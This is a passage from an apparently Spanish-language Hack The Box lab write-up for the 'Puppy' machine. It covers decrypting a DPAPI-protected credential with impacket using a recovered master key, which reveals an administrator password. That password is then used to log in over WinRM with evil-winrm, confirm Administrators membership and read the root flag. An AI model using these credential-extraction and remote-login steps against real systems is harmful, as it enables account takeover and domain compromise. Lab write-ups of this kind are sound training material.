Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Con la master key ya descifrada puedo descifrar el archivo de credencial protegido por DPAPI

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy/content]
└─$ impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

- El archivo contenía credenciales para steph.cooper_adm / FivethChipOnItsWay2025!

BloodHound me indica que este usuario pertenece a **Remote Managment Users** y a **Administrators** asi que ahora puedo logearme via WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/puppy/loot]
└─$ evil-winrm -i puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> whoami
puppy\steph.cooper_adm
```

Podemos ver que pertenecemos al grupo **Administrators**.

```bash
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> net user steph.cooper_adm
User name                    steph.cooper_adm
Full Name                    Stephen A. Cooper
Comment
User's' comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/8/2025 7:50:40 AM
Password expires             Never
Password changeable          3/9/2025 7:50:40 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/9/2026 9:56:18 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.
```

Flag:

```bash
*Evil-WinRM* PS C:\Users\administrator\Desktop> type root.txt
d85630b77d5204b5f5725bffb6f7d95e
```

***PWNED***

![](assets/Pasted%20image%2020260109165843.png)